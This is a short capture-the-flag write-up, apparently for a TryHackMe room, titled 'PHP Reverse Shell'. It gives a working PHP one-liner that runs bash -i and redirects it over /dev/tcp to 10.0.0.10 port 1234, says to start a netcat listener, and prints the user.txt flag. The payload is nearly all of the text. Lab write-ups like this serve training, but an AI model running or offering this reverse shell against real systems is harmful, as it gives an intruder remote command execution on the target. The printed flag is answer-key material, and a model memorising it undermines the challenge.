## PHP Reverse Shell

We can use a pretty simple one liner to get a reverse shell connection using PHP

`<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.10/1234 0>&1'"); ?>`

* we just have to set up a netcase listener on port 1234 and we should get a connection back
* we can read the user.txt file after gaining a connection
* user.txt: `THM{y0u_g0t_a_sh3ll}`
